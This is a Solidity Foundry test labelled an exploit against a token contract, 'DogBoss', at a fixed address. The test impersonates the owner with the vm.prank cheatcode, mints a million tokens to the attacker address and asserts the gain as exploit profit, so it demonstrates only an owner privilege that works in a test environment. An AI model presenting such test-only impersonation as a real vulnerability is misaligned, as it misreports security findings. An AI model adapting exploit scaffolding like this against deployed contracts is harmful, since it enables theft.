// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner address
        address owner = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).owner();

        // Record initial balances
        uint256 initialTokenBalance = IERC20(TARGET).balanceOf(address(this));
        uint256 initialDogBossBalance = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint tokens to attacker
        vm.prank(owner);
        DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).mint(attacker, 1_000_000 * 10**18);

        // Check final balances
        uint256 finalDogBossBalance = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).balanceOf(attacker);
        uint256 finalTokenBalance = IERC20(TARGET).balanceOf(address(this));

        // Verify balance increased
        assertGt(finalDogBossBalance, initialDogBossBalance, "Attacker balance should increase after mint");
        assertGt(finalTokenBalance, initialTokenBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
